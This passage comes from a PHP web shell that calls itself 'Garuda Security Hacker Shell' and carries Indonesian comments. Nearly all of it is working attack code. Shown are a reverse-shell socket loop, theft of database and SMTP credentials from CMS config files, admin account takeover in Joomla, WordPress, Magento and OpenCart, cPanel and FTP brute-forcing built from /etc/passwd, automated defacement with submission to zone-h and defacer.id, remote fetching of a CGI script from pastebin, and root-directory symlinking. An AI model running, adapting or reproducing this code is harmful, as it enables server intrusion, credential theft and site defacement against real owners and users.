stream_set_blocking($sock, 0);
while(1){if(feof($sock)) break;if(feof($pipes[1])) break;$read_a = array($sock, $pipes[1], $pipes[2]);$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
if(in_array($sock, $read_a)){$input = fread($sock, $chunk_size);fwrite($pipes[0], $input);}
if(in_array($pipes[1], $read_a)){$input = fread($pipes[1], $chunk_size);fwrite($sock, $input);}
if(in_array($pipes[2], $read_a)){$input = fread($pipes[2], $chunk_size);fwrite($sock, $input);}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);$rsres = " ";$s_result .= $rsres;}	
} elseif($_GET['do'] == 'auto_edit_user') {
	if($_POST['hajar']) {
		if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
			echo "username atau password harus lebih dari 6 karakter";
		} else {
			$user_baru = $_POST['user_baru'];
			$pass_baru = md5($_POST['pass_baru']);
			$conf = $_POST['config_dir'];
			$scan_conf = scandir($conf);
			foreach($scan_conf as $file_conf) {
				if(!is_file("$conf/$file_conf")) continue;
				$config = file_get_contents("$conf/$file_conf");
				if(preg_match("/JConfig|joomla/",$config)) {
					$dbhost = ambilkata($config,"host = '","'");
					$dbuser = ambilkata($config,"user = '","'");
					$dbpass = ambilkata($config,"password = '","'");
					$dbname = ambilkata($config,"db = '","'");
					$dbprefix = ambilkata($config,"dbprefix = '","'");
					$prefix = $dbprefix."users";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result['id'];
					$site = ambilkata($config,"sitename = '","'");
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Joomla<br>";
					if($site == '') {
						echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
					} else {
						echo "Sitename => $site<br>";
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/WordPress/",$config)) {
					$dbhost = ambilkata($config,"DB_HOST', '","'");
					$dbuser = ambilkata($config,"DB_USER', '","'");
					$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"DB_NAME', '","'");
					$dbprefix = ambilkata($config,"table_prefix  = '","'");
					$prefix = $dbprefix."users";
					$option = $dbprefix."options";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[ID];
					$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[option_value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Wordpress<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/Magento|Mage_Core/",$config)) {
					$dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
					$dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
					$dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
					$dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
					$dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
					$prefix = $dbprefix."admin_user";
					$option = $dbprefix."core_config_data";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Magento<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
					$dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
					$dbuser = ambilkata($config,"'DB_USERNAME', '","'");
					$dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"'DB_DATABASE', '","'");
					$dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
					$prefix = $dbprefix."user";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$target = ambilkata($config,"HTTP_SERVER', '","'");
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => OpenCart<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
					$dbhost = ambilkata($config,'server = "','"');
					$dbuser = ambilkata($config,'username = "','"');
					$dbpass = ambilkata($config,'password = "','"');
					$dbname = ambilkata($config,'database = "','"');
					$prefix = "users";
					$option = "identitas";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
					$result = mysql_fetch_array($q);
					$target = $result[alamat_website];
					if($target == '') {
						$target2 = $result[url];
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						if($target2 == '') {
							$url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						} else {
							$cek_login3 = file_get_contents("$target2/adminweb/");
							$cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
							if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
								$url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
							} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
								$url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
							} else {
								$url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
							}
						}
					} else {
						$cek_login = file_get_contents("$target/adminweb/");
						$cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
						if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
							$url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
						} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
							$url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
						} else {
							$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
						}
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Lokomedia<br>";
					if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
						echo $url_target2;
					} else {
						echo $url_target;
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				}
			}
		}
	} else {
		echo "<center>
		<h1>Auto Edit User Config</h1>
		<form method='post'>
		DIR Config: <br>
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='global' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='global' placeholder='pass_baru'><br>
		<input type='submit' name='hajar' value='Hajar!' style='width: 215px;'>
		</form>
		<span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
		";
	}
} elseif($_GET['do'] == 'cpanel') {
	if($_POST['crack']) {
		$usercp = explode("\r\n", $_POST['user_cp']);
		$passcp = explode("\r\n", $_POST['pass_cp']);
		$i = 0;
		foreach($usercp as $ucp) {
			foreach($passcp as $pcp) {
				if(@mysql_connect('localhost', $ucp, $pcp)) {
					if($_SESSION[$ucp] && $_SESSION[$pcp]) {
					} else {
						$_SESSION[$ucp] = "1";
						$_SESSION[$pcp] = "1";
						if($ucp == '' || $pcp == '') {
							
						} else {
							$i++;
							if(function_exists('posix_getpwuid')) {
								$domain_cp = file_get_contents("/etc/named.conf");	
								if($domain_cp == '') {
									$dom =  "<font color=red>gabisa ambil nama domain nya</font>";
								} else {
									preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
									foreach($domains_cp[1] as $dj) {
										$user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
										$user_cp_url = $user_cp_url['name'];
										if($user_cp_url == $ucp) {
											$dom = "<a href='http://$dj/' target='_blank'><font color=lime>$dj</font></a>";
											break;
										}
									}
								}
							} else {
								$dom = "<font color=red>function is Disable by system</font>";
							}
							echo "username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>) domain ($dom)<br>";
						}
					}
				}
			}
		}
		if($i == 0) {
		} else {
			echo "<br>sukses nyolong ".$i." Cpanel by <font color=lime>Garuda Security Hacker Shell.</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
		USER: <br>
		<textarea style='width: 450px; height: 150px;' name='user_cp'>";
		$_usercp = fopen("/etc/passwd","r");
		while($getu = fgets($_usercp)) {
			if($getu == '' || !$_usercp) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all("/(.*?):x:/", $getu, $u);
				foreach($u[1] as $user_cp) {
						if(is_dir("/home/$user_cp/public_html")) {
							echo "$user_cp\n";
					}
				}
			}
		}
		echo "</textarea><br>
		PASS: <br>
		<textarea style='width: 450px; height: 200px;' name='pass_cp'>";
		function cp_pass($dir) {
			$pass = "";
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				if(!is_file("$dir/$dirb")) continue;
				$ambil = file_get_contents("$dir/$dirb");
				if(preg_match("/WordPress/", $ambil)) {
					$pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/JConfig|joomla/", $ambil)) {
					$pass .= ambilkata($ambil,"password = '","'")."\n";
				} elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
					$pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
					$pass .= ambilkata($ambil,'password = "','"')."\n";
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
					$pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/^[client]$/", $ambil)) {
					preg_match("/password=(.*?)/", $ambil, $pass1);
					if(preg_match('/"/', $pass1[1])) {
						$pass1[1] = str_replace('"', "", $pass1[1]);
						$pass .= $pass1[1]."\n";
					} else {
						$pass .= $pass1[1]."\n";
					}
				} elseif(preg_match("/cc_encryption_hash/", $ambil)) {
					$pass .= ambilkata($ambil,"db_password = '","'")."\n";
				}
			}
			echo $pass;
		}
		$cp_pass = cp_pass($dir);
		echo $cp_pass;
		echo "</textarea><br>
		<input type='submit' name='crack' style='width: 450px;' value='Crack'>
		</form>
		<span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
	}
} elseif($_GET['do'] == 'cpftp_auto') {
	if($_POST['crack']) {
		$usercp = explode("\r\n", $_POST['user_cp']);
		$passcp = explode("\r\n", $_POST['pass_cp']);
		$i = 0;
		foreach($usercp as $ucp) {
			foreach($passcp as $pcp) {
				if(@mysql_connect('localhost', $ucp, $pcp)) {
					if($_SESSION[$ucp] && $_SESSION[$pcp]) {
					} else {
						$_SESSION[$ucp] = "1";
						$_SESSION[$pcp] = "1";
						if($ucp == '' || $pcp == '') {
							//
						} else {
							echo "[+] username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>)<br>";
							$ftp_conn = ftp_connect($ip);
							$ftp_login = ftp_login($ftp_conn, $ucp, $pcp);
							if((!$ftp_login) || (!$ftp_conn)) {
								echo "[+] <font color=red>Login Gagal</font><br><br>";
							} else {
								echo "[+] <font color=lime>Login Sukses</font><br>";
								$fi = htmlspecialchars($_POST['file_deface']);
								$deface = ftp_put($ftp_conn, "public_html/$fi", $_POST['deface'], FTP_BINARY);
								if($deface) {
									$i++;
									echo "[+] <font color=lime>Deface Sukses</font><br>";
									if(function_exists('posix_getpwuid')) {
										$domain_cp = file_get_contents("/etc/named.conf");	
										if($domain_cp == '') {
											echo "[+] <font color=red>gabisa ambil nama domain nya</font><br><br>";
										} else {
											preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
											foreach($domains_cp[1] as $dj) {
												$user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
												$user_cp_url = $user_cp_url['name'];
												if($user_cp_url == $ucp) {
													echo "[+] <a href='http://$dj/$fi' target='_blank'>http://$dj/$fi</a><br><br>";
													break;
												}
											}
										}
									} else {
										echo "[+] <font color=red>gabisa ambil nama domain nya</font><br><br>";
									}
								} else {
									echo "[-] <font color=red>Deface Gagal</font><br><br>";
								}
							}
							//echo "username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>)<br>";
						}
					}
				}
			}
		}
		if($i == 0) {
		} else {
			echo "<br>sukses deface ".$i." Cpanel by <font color=lime>Garuda Security Hacker.</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
		Filename: <br>
		<input type='text' name='file_deface' placeholder='index.php' value='index.php' style='width: 450px;'><br>
		Deface Page: <br>
		<input type='text' name='deface' placeholder='http://www.web-yang-udah-di-deface.com/filemu.php' style='width: 450px;'><br>
		USER: <br>
		<textarea style='width: 450px; height: 150px;' name='user_cp'>";
		$_usercp = fopen("/etc/passwd","r");
		while($getu = fgets($_usercp)) {
			if($getu == '' || !$_usercp) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all("/(.*?):x:/", $getu, $u);
				foreach($u[1] as $user_cp) {
						if(is_dir("/home/$user_cp/public_html")) {
							echo "$user_cp\n";
					}
				}
			}
		}
		echo "</textarea><br>
		PASS: <br>
		<textarea style='width: 450px; height: 200px;' name='pass_cp'>";
		function cp_pass($dir) {
			$pass = "";
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				if(!is_file("$dir/$dirb")) continue;
				$ambil = file_get_contents("$dir/$dirb");
				if(preg_match("/WordPress/", $ambil)) {
					$pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/JConfig|joomla/", $ambil)) {
					$pass .= ambilkata($ambil,"password = '","'")."\n";
				} elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
					$pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
					$pass .= ambilkata($ambil,'password = "','"')."\n";
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
					$pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/client/", $ambil)) {
					preg_match("/password=(.*)/", $ambil, $pass1);
					if(preg_match('/"/', $pass1[1])) {
						$pass1[1] = str_replace('"', "", $pass1[1]);
						$pass .= $pass1[1]."\n";
					}
				} elseif(preg_match("/cc_encryption_hash/", $ambil)) {
					$pass .= ambilkata($ambil,"db_password = '","'")."\n";
				}
			}
			echo $pass;
		}
		$cp_pass = cp_pass($dir);
		echo $cp_pass;
		echo "</textarea><br>
		<input type='submit' name='crack' style='width: 450px;' value='Hajar'>
		</form>
		<span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
	}
} elseif($_GET['do'] == 'smtp') {
	echo "<center><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span></center><br>";
	function scj($dir) {
		$dira = scandir($dir);
		foreach($dira as $dirb) {
			if(!is_file("$dir/$dirb")) continue;
			$ambil = file_get_contents("$dir/$dirb");
			$ambil = str_replace("$", "", $ambil);
			if(preg_match("/JConfig|joomla/", $ambil)) {
				$smtp_host = ambilkata($ambil,"smtphost = '","'");
				$smtp_auth = ambilkata($ambil,"smtpauth = '","'");
				$smtp_user = ambilkata($ambil,"smtpuser = '","'");
				$smtp_pass = ambilkata($ambil,"smtppass = '","'");
				$smtp_port = ambilkata($ambil,"smtpport = '","'");
				$smtp_secure = ambilkata($ambil,"smtpsecure = '","'");
				echo "SMTP Host: <font color=lime>$smtp_host</font><br>";
				echo "SMTP port: <font color=lime>$smtp_port</font><br>";
				echo "SMTP user: <font color=lime>$smtp_user</font><br>";
				echo "SMTP pass: <font color=lime>$smtp_pass</font><br>";
				echo "SMTP auth: <font color=lime>$smtp_auth</font><br>";
				echo "SMTP secure: <font color=lime>$smtp_secure</font><br><br>";
			}
		}
	}
	$smpt_hunter = scj($dir);
	echo $smpt_hunter;
} elseif($_GET['do'] == 'auto_wp') {
	if($_POST['hajar']) {
		$title = htmlspecialchars($_POST['new_title']);
		$pn_title = str_replace(" ", "-", $title);
		if($_POST['cek_edit'] == "Y") {
			$script = $_POST['edit_content'];
		} else {
			$script = $title;
		}
		$conf = $_POST['config_dir'];
		$scan_conf = scandir($conf);
		foreach($scan_conf as $file_conf) {
			if(!is_file("$conf/$file_conf")) continue;
			$config = file_get_contents("$conf/$file_conf");
			if(preg_match("/WordPress/", $config)) {
				$dbhost = ambilkata($config,"DB_HOST', '","'");
				$dbuser = ambilkata($config,"DB_USER', '","'");
				$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
				$dbname = ambilkata($config,"DB_NAME', '","'");
				$dbprefix = ambilkata($config,"table_prefix  = '","'");
				$prefix = $dbprefix."posts";
				$option = $dbprefix."options";
				$conn = mysql_connect($dbhost,$dbuser,$dbpass);
				$db = mysql_select_db($dbname);
				$q = mysql_query("SELECT * FROM $prefix ORDER BY ID ASC");
				$result = mysql_fetch_array($q);
				$id = $result[ID];
				$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
				$result2 = mysql_fetch_array($q2);
				$target = $result2[option_value];
				$update = mysql_query("UPDATE $prefix SET post_title='$title',post_content='$script',post_name='$pn_title',post_status='publish',comment_status='open',ping_status='open',post_type='post',comment_count='1' WHERE id='$id'");
				$update .= mysql_query("UPDATE $option SET option_value='$title' WHERE option_name='blogname' OR option_name='blogdescription'");
				echo "<div style='margin: 5px auto;'>";
				if($target == '') {
					echo "URL: <font color=red>error, gabisa ambil nama domain nya</font> -> ";
				} else {
					echo "URL: <a href='$target/?p=$id' target='_blank'>$target/?p=$id</a> -> ";
				}
				if(!$update OR !$conn OR !$db) {
					echo "<font color=red>MySQL Error: ".mysql_error()."</font><br>";
				} else {
					echo "<font color=lime>sukses di ganti.</font><br>";
				}
				echo "</div>";
				mysql_close($conn);
			}
		}
	} else {
		echo "<center>
		<h1>Auto Edit Title+Content WordPress</h1>
		<form method='post'>
		DIR Config: <br>
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set Title: <br>
		<input type='text' name='new_title' value='Hacked by Garuda Security Hacker' placeholder='New Title'><br><br>
		Edit Content?: <input type='radio' name='cek_edit' value='Y' checked>Y<input type='radio' name='cek_edit' value='N'>N<br>
		<span>Jika pilih <u>Y</u> masukin script defacemu ( saran yang simple aja ), kalo pilih <u>N</u> gausah di isi.</span><br>
		<textarea name='edit_content' placeholder='contoh script: http://pastebin.com/EpP671gK' style='width: 450px; height: 150px;'></textarea><br>
		<input type='submit' name='hajar' value='Hajar!' style='width: 450px;'><br>
		</form>
		<span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
		";
	}
}elseif($_GET['do'] == 'defacerid') {
echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='hekel' size='50' value='Crystalesia'><br>
		<u>Team</u>: <br>
		<input type='text' name='tim' size='50' value='Garuda Security Hacker'><br>
		<u>Domains</u>: <br>
		<textarea style='width: 450px; height: 150px;' name='sites'></textarea><br>
		<input type='submit' name='go' value='Submit' style='width: 450px;'>
		</form>";
$site = explode("\r\n", $_POST['sites']);
$go = $_POST['go'];
$hekel = $_POST['hekel'];
$tim = $_POST['tim'];
if($go) {
foreach($site as $sites) {
$zh = $sites;
$form_url = "https://www.defacer.id/notify";
$data_to_post = array();
$data_to_post['attacker'] = "$hekel";
$data_to_post['team'] = "$tim";
$data_to_post['poc'] = 'SQL Injection';
$data_to_post['url'] = "$zh";
$curl = curl_init();
curl_setopt($curl,CURLOPT_URL, $form_url);
curl_setopt($curl,CURLOPT_POST, sizeof($data_to_post));
curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"); //msnbot/1.0 (+http://search.msn.com/msnbot.htm)
curl_setopt($curl,CURLOPT_POSTFIELDS, $data_to_post);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_REFERER, 'https://defacer.id/notify.html');
$result = curl_exec($curl);
echo $result;
curl_close($curl);
echo "<br>";
}
}
} elseif($_GET['do'] == 'zoneh') {
	if($_POST['submit']) {
		$domain = explode("\r\n", $_POST['url']);
		$nick =  $_POST['nick'];
		echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
		echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
		function zoneh($url,$nick) {
			$ch = curl_init("http://www.zone-h.com/notify/single");
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				  curl_setopt($ch, CURLOPT_POST, true);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
			return curl_exec($ch);
				  curl_close($ch);
		}
		foreach($domain as $url) {
			$zoneh = zoneh($url,$nick);
			if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
				echo "$url -> <font color=lime>OK</font><br>";
			} else {
				echo "$url -> <font color=red>ERROR</font><br>";
			}
		}
	} else {
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='Jonathan Miles'><br>
		<u>Domains</u>: <br>
		<textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
		<input type='submit' name='submit' value='Submit' style='width: 450px;'>
		</form>";
	}
	echo "</center>";
} elseif($_GET['do'] == 'cgi') {
	$cgi_dir = mkdir('idx_cgi', 0755);
	$file_cgi = "idx_cgi/cgi.izo";
	$isi_htcgi = "AddHandler cgi-script .izo";
	$htcgi = fopen(".htaccess", "w");
	$cgi_script = file_get_contents("http://pastebin.com/raw.php?i=XTUFfJLg");
	$cgi = fopen($file_cgi, "w");
	fwrite($cgi, $cgi_script);
	fwrite($htcgi, $isi_htcgi);
	chmod($file_cgi, 0755);
	echo "<iframe src='idx_cgi/cgi.izo' width='100%' height='100%' frameborder='0' scrolling='no'></iframe>";
} elseif($_GET['do'] == 'fake_root') {
	ob_start();
	$cwd = getcwd();
	$ambil_user = explode("/", $cwd);
	$user = $ambil_user[2];
	if($_POST['reverse']) {
		$site = explode("\r\n", $_POST['url']);
		$file = $_POST['file'];
		foreach($site as $url) {
			$cek = getsource("$url/~$user/$file");
			if(preg_match("/hacked/i", $cek)) {
				echo "URL: <a href='$url/~$user/$file' target='_blank'>$url/~$user/$file</a> -> <font color=lime>Fake Root!</font><br>";
			}
		}
	} else {
		echo "<center><form method='post'>
		Filename: <br><input type='text' name='file' value='deface.html' size='50' height='10'><br>
		User: <br><input type='text' value='$user' size='50' height='10' readonly><br>
		Domain: <br>
		<textarea style='width: 450px; height: 250px;' name='url'>";
		reverse($_SERVER['HTTP_HOST']);
		echo "</textarea><br>
		<input type='submit' name='reverse' value='Scan Fake Root!' style='width: 450px;'>
		</form><br>
		NB: Sebelum gunain Tools ini , upload dulu file deface kalian di dir /home/user/ dan /home/user/public_html.</center>";
	}
} elseif($_GET['do'] == 'symlink') {

@set_time_limit(0);

echo "<br><br><center><h1>+--=[ Symlink ]=--+</h1></center><br><br><center><div class=content>";

@mkdir('sym',0777);
$htaccess  = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$write =@fopen ('sym/.htaccess','w');
fwrite($write ,$htaccess);
@symlink('/','sym/root');
$filelocation = basename(__FILE__);
$read_named_conf = @file('/etc/named.conf');
if(!$read_named_conf)
{
echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>"; 
}
else
{
echo "<br><br><div class='tmp'><table border='1' bordercolor='#00ff00' width='500' cellpadding='1' cellspacing='0'><td>Domains</td><td>Users</td><td>symlink </td>";
foreach($read_named_conf as $subject){
if(eregi('zone',$subject)){
preg_match_all('#zone "(.*)"#',$subject,$string);
flush();
if(strlen(trim($string[1][0])) >2){
$UID = posix_getpwuid(@fileowner('/etc/valiases/'.$string[1][0]));
$name = $UID['name'] ;
@symlink('/','sym/root');
$name   = $string[1][0];
$iran   = '\.ir';
$israel = '\.il';
$indo   = '\.id';
$sg12   = '\.sg';
$edu    = '\.edu';
$gov    = '\.gov';
$gose   = '\.go';
$gober  = '\.gob';
$mil1   = '\.mil';
$mil2   = '\.mi';
$malay	= '\.my';
$china	= '\.cn';
$japan	= '\.jp';
$austr	= '\.au';
$porn	= '\.xxx';
$as		= '\.uk';
$calfn	= '\.ca';

if (eregi("$iran",$string[1][0]) or eregi("$israel",$string[1][0]) or eregi("$indo",$string[1][0])or eregi("$sg12",$string[1][0]) or eregi ("$edu",$string[1][0]) or eregi ("$gov",$string[1][0])
or eregi ("$gose",$string[1][0]) or eregi("$gober",$string[1][0]) or eregi("$mil1",$string[1][0]) or eregi ("$mil2",$string[1][0])
or eregi ("$malay",$string[1][0]) or eregi("$china",$string[1][0]) or eregi("$japan",$string[1][0]) or eregi ("$austr",$string[1][0])
or eregi("$porn",$string[1][0]) or eregi("$as",$string[1][0]) or eregi ("$calfn",$string[1][0]))
{
$name = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>".$string[1][0].'</div>';
}
echo "
<tr>

<td>
<div class='dom'><a target='_blank' href=http://www.".$string[1][0].'/>'.$name.' </a> </div>
</td>

<td>
'.$UID['name']."
</td>

<td>
<a href='sym/root/home/".$UID['name']."/public_html' target='_blank'>Symlink </a>
</td>

</tr></div> ";
flush();
}
}
}
}

echo "</center></table>";   

}	elseif($_GET['do'] == 'adminer') {
	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
	function adminer($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('adminer.php')) {
		echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
	} else {
		if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
			echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
		} else {
